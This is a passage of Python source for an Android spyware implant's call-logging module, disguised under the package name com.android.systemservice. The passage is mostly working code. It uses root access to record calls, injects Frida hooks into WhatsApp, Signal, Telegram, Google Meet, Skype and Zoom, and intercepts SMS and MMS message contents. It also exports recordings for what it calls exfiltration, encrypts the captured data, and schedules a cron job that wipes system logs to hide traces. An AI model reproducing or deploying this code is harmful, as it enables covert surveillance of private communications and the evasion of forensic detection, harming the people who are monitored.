                        "emails": matching_contact.get('emails', []),
                        "addresses": matching_contact.get('addresses', [])
                    }
                else:
                    call['contact_info'] = {"name": "Unknown"}
        
        return calls
    
    def _numbers_match(self, num1: str, num2: str) -> bool:
        """Check if two phone numbers match (handles formatting differences)"""

        clean1 = ''.join(filter(str.isdigit, num1))
        clean2 = ''.join(filter(str.isdigit, num2))
        

        return clean1[-10:] == clean2[-10:] if len(clean1) >= 10 and len(clean2) >= 10 else clean1 == clean2
    
    def _ensure_contacts_synced(self):
        """Ensure contacts are synced and up to date"""
        if not self.contacts_cache or time.time() - self.last_contacts_sync > 3600:
            self.sync_contacts({"force": True})
    
    def get_contact_info(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get detailed information for specific contact"""
        try:
            number = args.get("number")
            contact_name = args.get("name")
            
            if not number and not contact_name:
                return {"error": "Either number or name must be provided"}
            
            self._ensure_contacts_synced()
            

            if number:
                if number in self.contacts_cache:
                    return {
                        "success": True,
                        "contact": self.contacts_cache[number]
                    }
                

                for contact_num, contact in self.contacts_cache.items():
                    if self._numbers_match(number, contact_num):
                        return {
                            "success": True,
                            "contact": contact
                        }
            

            if contact_name:
                for contact in self.contacts_cache.values():
                    if contact_name.lower() in contact.get('name', '').lower():
                        return {
                            "success": True,
                            "contact": contact
                        }
            
            return {"error": "Contact not found"}
            
        except Exception as e:
            return {"error": f"Contact lookup failed: {str(e)}"}
    
    def stop_recording(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Stop active call recording"""
        try:
            recording_id = args.get("recording_id")
            
            if not recording_id:
                return {"error": "recording_id required"}
            
            if recording_id not in self.active_recordings:
                return {"error": f"Recording {recording_id} not found"}
            
            recording = self.active_recordings[recording_id]
            

            stop_cmd = [
                "su", "-c",
                f"am stopservice com.android.systemservice/.CallRecordingService"
            ]
            subprocess.run(stop_cmd, capture_output=True)
            
            recording["status"] = "stopped"
            recording["stopped_at"] = time.time()
            recording["duration"] = recording["stopped_at"] - recording["started_at"]
            

            self.call_history.append(recording)
            del self.active_recordings[recording_id]
            

            self.agent.offline_logger.log_event("call_recording_stopped", {
                "recording_id": recording_id,
                "duration": recording["duration"],
                "file_path": recording["file_path"]
            })
            
            return {
                "success": True,
                "message": f"Recording {recording_id} stopped",
                "duration": recording["duration"],
                "file_path": recording["file_path"]
            }
            
        except Exception as e:
            return {"error": f"Failed to stop recording: {str(e)}"}
    
    def export_recordings(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export recorded calls for exfiltration"""
        try:
            recording_ids = args.get("recording_ids", [])
            export_format = args.get("format", "json")
            
            if not recording_ids:
                recordings_to_export = self.call_history
            else:
                recordings_to_export = [
                    rec for rec in self.call_history
                    if rec["id"] in recording_ids
                ]
            
            export_data = {
                "exported_at": time.time(),
                "campaign": self.agent.campaign,
                "device_id": self.agent.device_id,
                "recordings": recordings_to_export,
                "format": export_format,
                "total_recordings": len(recordings_to_export)
            }
            

            export_id = self.agent.offline_logger.log_event("call_recordings_exported", export_data)
            
            return {
                "success": True,
                "export_id": export_id,
                "exported_count": len(recordings_to_export),
                "message": f"Exported {len(recordings_to_export)} recordings"
            }
            
        except Exception as e:
            return {"error": f"Failed to export recordings: {str(e)}"}
    
    def list_active_recordings(self) -> Dict[str, Any]:
        """List currently active recordings"""
        return {
            "success": True,
            "active_recordings": self.active_recordings,
            "count": len(self.active_recordings)
        }
    
    def hook_voip_apps(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Hook VoIP applications for call interception"""
        try:
            apps = args.get("apps", ["whatsapp", "signal", "telegram", "skype", "zoom"])
            record_calls = args.get("record_calls", True)
            hook_id = f"voip_{int(time.time())}"
            
            hooks_applied = []
            
            for app in apps:
                if app.lower() == "whatsapp":
                    success = self._hook_whatsapp_calls(hook_id, record_calls)
                elif app.lower() == "signal":
                    success = self._hook_signal_calls(hook_id, record_calls)
                elif app.lower() == "telegram":
                    success = self._hook_telegram_calls(hook_id, record_calls)
                elif app.lower() == "meet" or app.lower() == "google_meet":
                    success = self._hook_google_meet_calls(hook_id, record_calls)
                elif app.lower() == "zoom":
                    success = self._hook_zoom_calls(hook_id, record_calls)
                else:
                    success = self._hook_generic_voip(app, hook_id, record_calls)
                
                if success:
                    hooks_applied.append(app)
            
            if hooks_applied:
                self.agent.offline_logger.log_event("voip_hooks_applied", {
                    "hook_id": hook_id,
                    "apps": hooks_applied,
                    "record_calls": record_calls
                })
                
                return {
                    "success": True,
                    "hook_id": hook_id,
                    "hooked_apps": hooks_applied,
                    "message": f"Successfully hooked {len(hooks_applied)} VoIP apps"
                }
            else:
                return {"error": "Failed to hook any VoIP applications"}
                
        except Exception as e:
            return {"error": f"VoIP hooking failed: {str(e)}"}
    
    def _hook_whatsapp_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook WhatsApp call functionality"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook WhatsApp call manager
                var VoiceService = Java.use("com.whatsapp.voipcalling.VoiceService");
                if (VoiceService) {{
                    VoiceService.startCall.implementation = function(callInfo) {{
                        console.log("[+] WhatsApp call started: " + JSON.stringify(callInfo));
                        
                        // Log call details
                        var callData = {{
                            "app": "whatsapp",
                            "type": "outgoing",
                            "timestamp": Date.now(),
                            "contact": callInfo.toString(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        // Send to logging system
                        Java.use("java.io.File").$new("/data/local/tmp/voip_calls.log")
                            .getAbsoluteFile().createNewFile();
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.startCall(callInfo);
                    }};
                    
                    VoiceService.incomingCall.implementation = function(callInfo) {{
                        console.log("[+] WhatsApp incoming call: " + JSON.stringify(callInfo));
                        
                        var callData = {{
                            "app": "whatsapp",
                            "type": "incoming",
                            "timestamp": Date.now(),
                            "contact": callInfo.toString(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.incomingCall(callInfo);
                    }};
                }}
                
                // Hook audio recording if requested
                if ({str(record_calls).lower()}) {{
                    var MediaRecorder = Java.use("android.media.MediaRecorder");
                    MediaRecorder.start.implementation = function() {{
                        console.log("[+] WhatsApp call recording started");
                        return this.start();
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.whatsapp", frida_script)
            
        except Exception as e:
            print(f"[!] WhatsApp hook failed: {e}")
            return False
    
    def _hook_signal_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook Signal call functionality"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook Signal calling
                var CallManager = Java.use("org.thoughtcrime.securesms.service.webrtc.CallManager");
                if (CallManager) {{
                    CallManager.call.implementation = function(recipient, isVideoCall) {{
                        console.log("[+] Signal call to: " + recipient + ", video: " + isVideoCall);
                        
                        var callData = {{
                            "app": "signal",
                            "type": "outgoing",
                            "recipient": recipient.toString(),
                            "is_video": isVideoCall,
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.call(recipient, isVideoCall);
                    }};
                }}
                
                // Hook incoming calls
                var WebRtcCallService = Java.use("org.thoughtcrime.securesms.service.webrtc.WebRtcCallService");
                if (WebRtcCallService) {{
                    WebRtcCallService.handleCallIncoming.implementation = function(intent) {{
                        console.log("[+] Signal incoming call");
                        
                        var callData = {{
                            "app": "signal",
                            "type": "incoming",
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.handleCallIncoming(intent);
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("org.thoughtcrime.securesms", frida_script)
            
        except Exception as e:
            print(f"[!] Signal hook failed: {e}")
            return False
    
    def _hook_telegram_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook Telegram call functionality"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook Telegram VoIP
                var VoIPService = Java.use("org.telegram.messenger.voip.VoIPService");
                if (VoIPService) {{
                    VoIPService.startOutgoingCall.implementation = function(user) {{
                        console.log("[+] Telegram outgoing call to user: " + user.id);
                        
                        var callData = {{
                            "app": "telegram",
                            "type": "outgoing",
                            "user_id": user.id,
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.startOutgoingCall(user);
                    }};
                    
                    VoIPService.startRinging.implementation = function() {{
                        console.log("[+] Telegram incoming call");
                        
                        var callData = {{
                            "app": "telegram",
                            "type": "incoming",
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.startRinging();
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("org.telegram.messenger", frida_script)
            
        except Exception as e:
            print(f"[!] Telegram hook failed: {e}")
            return False
    
    def _hook_google_meet_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook Google Meet call functionality"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook Google Meet calling
                var MeetCallService = Java.use("com.google.android.apps.tachyon.call.service.TelecomCallService");
                if (MeetCallService) {{
                    MeetCallService.onCallAdded.implementation = function(call) {{
                        console.log("[+] Google Meet call added: " + call.toString());
                        
                        var callData = {{
                            "app": "google_meet",
                            "type": "outgoing",
                            "call_id": call.toString(),
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.onCallAdded(call);
                    }};
                }}
                
                // Hook Meet video calling
                var VideoCallManager = Java.use("com.google.android.apps.tachyon.call.history.CallLogManager");
                if (VideoCallManager) {{
                    VideoCallManager.insertCallLogEntry.implementation = function(entry) {{
                        console.log("[+] Google Meet call logged: " + entry.toString());
                        
                        var callData = {{
                            "app": "google_meet",
                            "type": "call_logged",
                            "entry": entry.toString(),
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.insertCallLogEntry(entry);
                    }};
                }}
                
                // Hook WebRTC for Meet calls
                var PeerConnectionFactory = Java.use("org.webrtc.PeerConnectionFactory");
                if (PeerConnectionFactory) {{
                    PeerConnectionFactory.createPeerConnection.implementation = function(rtcConfig, constraints, observer) {{
                        console.log("[+] Google Meet WebRTC connection created");
                        
                        var callData = {{
                            "app": "google_meet",
                            "type": "webrtc_connection",
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.createPeerConnection(rtcConfig, constraints, observer);
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.google.android.apps.tachyon", frida_script)
            
        except Exception as e:
            print(f"[!] Google Meet hook failed: {e}")
            return False
    
    def _hook_skype_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook Skype call functionality (legacy)"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook Skype calling
                var CallService = Java.use("com.skype.CallService");
                if (CallService) {{
                    CallService.startCall.implementation = function(contact, isVideo) {{
                        console.log("[+] Skype call to: " + contact + ", video: " + isVideo);
                        
                        var callData = {{
                            "app": "skype",
                            "type": "outgoing",
                            "contact": contact.toString(),
                            "is_video": isVideo,
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.startCall(contact, isVideo);
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.skype.raider", frida_script)
            
        except Exception as e:
            print(f"[!] Skype hook failed: {e}")
            return False
    
    def _hook_zoom_calls(self, hook_id: str, record_calls: bool) -> bool:
        """Hook Zoom call functionality"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook Zoom calling
                var ZoomSDK = Java.use("us.zoom.sdk.ZoomSDK");
                if (ZoomSDK) {{
                    var MeetingService = ZoomSDK.getInstance().getMeetingService();
                    if (MeetingService) {{
                        MeetingService.joinMeetingWithParams.implementation = function(context, meetingParams, options) {{
                            console.log("[+] Zoom meeting joined: " + meetingParams.meetingNo);
                            
                            var callData = {{
                                "app": "zoom",
                                "type": "meeting",
                                "meeting_id": meetingParams.meetingNo,
                                "timestamp": Date.now(),
                                "hook_id": "{hook_id}"
                            }};
                            
                            var FileWriter = Java.use("java.io.FileWriter");
                            var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                            writer.write(JSON.stringify(callData) + "\n");
                            writer.close();
                            
                            return this.joinMeetingWithParams(context, meetingParams, options);
                        }};
                    }}
                }}
            }});
            """
            
            return self._inject_frida_script("us.zoom.videomeetings", frida_script)
            
        except Exception as e:
            print(f"[!] Zoom hook failed: {e}")
            return False
    
    def _hook_generic_voip(self, package: str, hook_id: str, record_calls: bool) -> bool:
        """Generic VoIP app hooking"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Generic WebRTC hooking
                var PeerConnectionFactory = Java.use("org.webrtc.PeerConnectionFactory");
                if (PeerConnectionFactory) {{
                    PeerConnectionFactory.createPeerConnection.implementation = function(rtcConfig, constraints, observer) {{
                        console.log("[+] WebRTC PeerConnection created for {package}");
                        
                        var callData = {{
                            "app": "{package}",
                            "type": "webrtc",
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                        
                        return this.createPeerConnection(rtcConfig, constraints, observer);
                    }};
                }}
                
                // Hook AudioManager for call detection
                var AudioManager = Java.use("android.media.AudioManager");
                AudioManager.setMode.implementation = function(mode) {{
                    if (mode == 3) {{ // MODE_IN_COMMUNICATION
                        console.log("[+] {package} entered communication mode");
                        
                        var callData = {{
                            "app": "{package}",
                            "type": "communication_mode",
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/voip_calls.log", true);
                        writer.write(JSON.stringify(callData) + "\n");
                        writer.close();
                    }}
                    return this.setMode(mode);
                }};
            }});
            """
            
            return self._inject_frida_script(package, frida_script)
            
        except Exception as e:
            print(f"[!] Generic VoIP hook failed for {package}: {e}")
            return False
    
    def intercept_sms_mms(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Intercept SMS and MMS messages"""
        try:
            intercept_sms = args.get("sms", True)
            intercept_mms = args.get("mms", True)
            real_time = args.get("real_time", True)
            hook_id = f"sms_{int(time.time())}"
            
            hooks_applied = []
            
            if intercept_sms:
                sms_success = self._hook_sms_interception(hook_id, real_time)
                if sms_success:
                    hooks_applied.append("SMS")
            
            if intercept_mms:
                mms_success = self._hook_mms_interception(hook_id, real_time)
                if mms_success:
                    hooks_applied.append("MMS")
            
            if hooks_applied:

                sms_history = self._extract_sms_history()
                mms_history = self._extract_mms_history()
                
                self.agent.offline_logger.log_event("sms_mms_interception_started", {
                    "hook_id": hook_id,
                    "intercepted_types": hooks_applied,
                    "real_time": real_time,
                    "existing_sms_count": len(sms_history),
                    "existing_mms_count": len(mms_history)
                })
                
                return {
                    "success": True,
                    "hook_id": hook_id,
                    "intercepted_types": hooks_applied,
                    "existing_sms": len(sms_history),
                    "existing_mms": len(mms_history),
                    "message": f"SMS/MMS interception active for: {', '.join(hooks_applied)}"
                }
            else:
                return {"error": "Failed to enable SMS/MMS interception"}
                
        except Exception as e:
            return {"error": f"SMS/MMS interception failed: {str(e)}"}
    
    def _hook_sms_interception(self, hook_id: str, real_time: bool) -> bool:
        """Hook SMS interception"""
        try:

            frida_script = f"""
            Java.perform(function() {{
                // Hook SMS provider
                var SmsManager = Java.use("android.telephony.SmsManager");
                
                // Hook outgoing SMS
                SmsManager.sendTextMessage.overload(
                    'java.lang.String', 'java.lang.String', 'java.lang.String',
                    'android.app.PendingIntent', 'android.app.PendingIntent'
                ).implementation = function(destinationAddress, scAddress, text, sentIntent, deliveryIntent) {{
                    console.log("[+] Outgoing SMS to: " + destinationAddress);
                    console.log("[+] Message: " + text);
                    
                    var smsData = {{
                        "type": "outgoing_sms",
                        "destination": destinationAddress,
                        "message": text,
                        "timestamp": Date.now(),
                        "hook_id": "{hook_id}"
                    }};
                    
                    var FileWriter = Java.use("java.io.FileWriter");
                    var writer = FileWriter.$new("/data/local/tmp/sms_intercept.log", true);
                    writer.write(JSON.stringify(smsData) + "\n");
                    writer.close();
                    
                    return this.sendTextMessage(destinationAddress, scAddress, text, sentIntent, deliveryIntent);
                }};
                
                // Hook incoming SMS broadcast receiver
                var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");
                BroadcastReceiver.onReceive.implementation = function(context, intent) {{
                    var action = intent.getAction();
                    if (action && action.equals("android.provider.Telephony.SMS_RECEIVED")) {{
                        console.log("[+] SMS received");
                        
                        var bundle = intent.getExtras();
                        if (bundle) {{
                            var pdus = bundle.get("pdus");
                            if (pdus) {{
                                var SmsMessage = Java.use("android.telephony.SmsMessage");
                                for (var i = 0; i < pdus.length; i++) {{
                                    var sms = SmsMessage.createFromPdu(pdus[i]);
                                    
                                    var smsData = {{
                                        "type": "incoming_sms",
                                        "sender": sms.getOriginatingAddress(),
                                        "message": sms.getMessageBody(),
                                        "timestamp": Date.now(),
                                        "hook_id": "{hook_id}"
                                    }};
                                    
                                    var FileWriter = Java.use("java.io.FileWriter");
                                    var writer = FileWriter.$new("/data/local/tmp/sms_intercept.log", true);
                                    writer.write(JSON.stringify(smsData) + "\n");
                                    writer.close();
                                }}
                            }}
                        }}
                    }}
                    return this.onReceive(context, intent);
                }};
            }});
            """
            

            receiver_cmd = [
                "su", "-c",
                "am start-service --user 0 -n com.android.systemservice/.SmsInterceptService"
            ]
            subprocess.run(receiver_cmd, capture_output=True)
            
            return self._inject_frida_script("com.android.mms", frida_script)
            
        except Exception as e:
            print(f"[!] SMS interception hook failed: {e}")
            return False
    
    def _hook_mms_interception(self, hook_id: str, real_time: bool) -> bool:
        """Hook MMS interception"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Hook MMS sending
                var MmsManager = Java.use("android.telephony.MmsManager");
                if (MmsManager) {{
                    MmsManager.sendMultimediaMessage.implementation = function(context, contentUri, locationUrl, configOverrides, sentIntent) {{
                        console.log("[+] MMS being sent to: " + locationUrl);
                        
                        var mmsData = {{
                            "type": "outgoing_mms",
                            "destination": locationUrl,
                            "content_uri": contentUri.toString(),
                            "timestamp": Date.now(),
                            "hook_id": "{hook_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/mms_intercept.log", true);
                        writer.write(JSON.stringify(mmsData) + "\n");
                        writer.close();
                        
                        return this.sendMultimediaMessage(context, contentUri, locationUrl, configOverrides, sentIntent);
                    }};
                }}
                
                // Hook MMS content observer
                var ContentObserver = Java.use("android.database.ContentObserver");
                ContentObserver.onChange.overload('boolean').implementation = function(selfChange) {{
                    console.log("[+] MMS content changed");
                    
                    // Check if this is MMS content
                    var uri = Java.use("android.net.Uri").parse("content://mms");
                    // Log MMS change
                    var mmsData = {{
                        "type": "mms_content_change",
                        "timestamp": Date.now(),
                        "hook_id": "{hook_id}"
                    }};
                    
                    var FileWriter = Java.use("java.io.FileWriter");
                    var writer = FileWriter.$new("/data/local/tmp/mms_intercept.log", true);
                    writer.write(JSON.stringify(mmsData) + "\n");
                    writer.close();
                    
                    return this.onChange(selfChange);
                }};
            }});
            """
            
            return self._inject_frida_script("com.android.mms", frida_script)
            
        except Exception as e:
            print(f"[!] MMS interception hook failed: {e}")
            return False
    

    def _derive_call_encryption_key(self) -> bytes:
        """Derive encryption key specific to call data"""
        import hashlib
        from utils.crypto import key_from_campaign_device
        

        base_key = key_from_campaign_device(
            self.agent.campaign,
            self.agent.device_fingerprint,
            "AES-256-GCM"
        )
        

        call_salt = f"calls_{int(time.time())}"
        

        return hashlib.pbkdf2_hmac(
            'sha256',
            base_key,
            call_salt.encode(),
            100000
        )[:32]
    
    def _calculate_optimal_recording_settings(self) -> Dict[str, Any]:
        """Calculate optimal recording settings based on device capabilities"""
        try:

            storage_free = self._get_free_storage()
            battery_level = self._get_battery_level()
            cpu_cores = self._get_cpu_count()
            

            if storage_free < 512 or battery_level < 15:

                return {
                    'audio_quality': 'low',
                    'sample_rate': 8000,
                    'bit_rate': 32000,
                    'format': 'm4a',
                    'compression': 'high'
                }
            elif storage_free > 2048 and battery_level > 50:

                return {
                    'audio_quality': 'high',
                    'sample_rate': 44100,
                    'bit_rate': 128000,
                    'format': 'm4a',
                    'compression': 'low'
                }
            else:

                return {
                    'audio_quality': 'medium',
                    'sample_rate': 22050,
                    'bit_rate': 64000,
                    'format': 'm4a',
                    'compression': 'medium'
                }
        except Exception:
            return {
                'audio_quality': 'medium',
                'sample_rate': 16000,
                'bit_rate': 48000,
                'format': 'm4a',
                'compression': 'medium'
            }
    
    def _initialize_security_measures(self):
        """Initialize security measures for call logging"""
        try:

            self._setup_encrypted_call_storage()
            

            self._setup_call_integrity_monitoring()
            

            self._setup_secure_voip_hooks()
            

            self._setup_call_log_cleanup()
            
        except Exception as e:
            print(f"[!] Call logger security initialization failed: {e}")
    
    def _optimize_for_performance(self):
        """Performance optimizations for call logging"""
        try:

            self._optimize_recording_processes()
            

            self._setup_efficient_call_queries()
            

            self._optimize_contact_sync()
            

            self._setup_call_data_compression()
            
        except Exception as e:
            print(f"[!] Call logger performance optimization failed: {e}")
    
    def _setup_monitoring(self):
        """Setup monitoring for call logging operations"""
        try:

            self.call_metrics.update({
                'start_time': time.time(),
                'calls_per_hour': 0,
                'recording_success_rate': 1.0,
                'voip_detection_rate': 0.0,
                'storage_usage_mb': 0,
                'contact_sync_frequency': 3600
            })
            

            self._setup_call_quality_monitoring()
            

            self._setup_call_alerting()
            
        except Exception as e:
            print(f"[!] Call logger monitoring setup failed: {e}")
    
    def _get_free_storage(self) -> int:
        """Get free storage space in MB"""
        try:
            result = subprocess.run(
                ["df", "/data/data/com.android.systemservice"],
                capture_output=True, text=True
            )
            lines = result.stdout.strip().split('\n')
            if len(lines) >= 2:
                fields = lines[1].split()
                return int(fields[3]) // 1024
            return 1024
        except Exception:
            return 1024
    
    def _get_battery_level(self) -> int:
        """Get current battery level percentage"""
        try:
            result = subprocess.run(
                ["su", "-c", "dumpsys battery | grep level"],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'level:' in line:
                    return int(line.split(':')[1].strip())
            return 50
        except Exception:
            return 50
    
    def _get_cpu_count(self) -> int:
        """Get number of CPU cores"""
        try:
            return int(subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip())
        except Exception:
            return 4
    
    def _setup_encrypted_call_storage(self):
        """Setup encrypted storage for call recordings"""
        try:

            encrypt_script = f'''
#!/system/bin/sh
INPUT_FILE="$1"
OUTPUT_FILE="$2"
KEY="{base64.b64encode(self.call_encryption_key).decode()}"

if [ -f "$INPUT_FILE" ]; then
    # Encrypt call recording using AES-256-GCM
    openssl enc -aes-256-gcm -salt -in "$INPUT_FILE" -out "$OUTPUT_FILE" -k "$KEY" 2>/dev/null
    if [ $? -eq 0 ]; then
        # Add metadata
        echo "$(date +%s):$(sha256sum \"$OUTPUT_FILE\" | cut -d' ' -f1)" >> "${{OUTPUT_FILE}}.meta"
        rm -f "$INPUT_FILE"  # Remove unencrypted original
    fi
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(encrypt_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/encrypt_call && chmod 755 /data/local/tmp/encrypt_call"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Encrypted call storage setup failed: {e}")
    
    def _setup_call_integrity_monitoring(self):
        """Setup integrity monitoring for call data"""
        try:
            integrity_script = '''
#!/system/bin/sh
# Monitor call recording integrity
for file in /data/data/com.android.systemservice/files/recordings/*.m4a; do
    if [ -f "$file" ]; then
        hash=$(sha256sum "$file" | cut -d' ' -f1)
        echo "$(date): $file $hash" >> /data/local/tmp/call_integrity.log
    fi
done

# Check VoIP call logs
if [ -f "/data/local/tmp/voip_calls.log" ]; then
    lines=$(wc -l < /data/local/tmp/voip_calls.log)
    echo "$(date): VoIP log entries: $lines" >> /data/local/tmp/call_integrity.log
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(integrity_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/call_integrity_check && chmod 755 /data/local/tmp/call_integrity_check"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Call integrity monitoring setup failed: {e}")
    
    def _setup_secure_voip_hooks(self):
        """Setup secure VoIP hooking mechanisms"""
        try:

            frida_deploy_script = '''
#!/system/bin/sh
# Secure Frida deployment for VoIP hooks

# Check if Frida server is running securely
if ! pgrep -f "frida-server" > /dev/null; then
    # Start Frida server with security options
    nohup frida-server -l 0.0.0.0:27042 > /dev/null 2>&1 &
    sleep 2
fi

# Verify Frida is accessible only locally
netstat -tlnp | grep :27042 | grep -q "127.0.0.1"
if [ $? -eq 0 ]; then
    echo "Frida server secured to localhost"
else
    echo "Warning: Frida server may be exposed"
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(frida_deploy_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/secure_frida && chmod 755 /data/local/tmp/secure_frida"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Secure VoIP hooks setup failed: {e}")
    
    def _setup_call_log_cleanup(self):
        """Setup automated call log cleanup"""
        try:
            cleanup_script = '''
#!/system/bin/sh
# Cleanup call logging traces

# Clean old call recordings (older than 7 days)
find /data/data/com.android.systemservice/files/recordings -name "*.m4a" -mtime +7 -delete 2>/dev/null

# Clean VoIP call logs (keep last 1000 entries)
if [ -f "/data/local/tmp/voip_calls.log" ]; then
    tail -1000 /data/local/tmp/voip_calls.log > /data/local/tmp/voip_calls.log.tmp
    mv /data/local/tmp/voip_calls.log.tmp /data/local/tmp/voip_calls.log
fi

# Clean SMS intercept logs
if [ -f "/data/local/tmp/sms_intercept.log" ]; then
    tail -1000 /data/local/tmp/sms_intercept.log > /data/local/tmp/sms_intercept.log.tmp
    mv /data/local/tmp/sms_intercept.log.tmp /data/local/tmp/sms_intercept.log
fi

# Clean system call logs that might contain traces
> /var/log/syslog
> /data/system/dropbox/*
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(cleanup_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/call_cleanup && chmod 755 /data/local/tmp/call_cleanup"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            

            cron_cmd = ["su", "-c", "echo '0 */6 * * * /data/local/tmp/call_cleanup' | crontab -"]
            subprocess.run(cron_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] Call log cleanup setup failed: {e}")
    
    def _optimize_recording_processes(self):
        """Optimize call recording processes"""
        try:

            optimization_script = '''
#!/system/bin/sh
# Optimize call recording processes

# Set lower priority for recording processes
for pid in $(pgrep -f "CallRecordingService|recording"); do
    renice +5 $pid 2>/dev/null
done

# Set CPU affinity for efficiency cores
for pid in $(pgrep -f "CallRecordingService"); do
    taskset -cp 0-3 $pid 2>/dev/null
done

# Optimize I/O priority
for pid in $(pgrep -f "recording"); do
    ionice -c 3 -p $pid 2>/dev/null
done
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(optimization_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/optimize_recording && chmod 755 /data/local/tmp/optimize_recording"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Recording process optimization failed: {e}")
    
    def _setup_efficient_call_queries(self):
        """Setup efficient call log queries"""
        try:

            query_script = '''
#!/system/bin/sh
# Optimized call log queries

# Create indexes for faster queries (if supported)
sqlite3 /data/data/com.android.providers.contacts/databases/calllog.db \
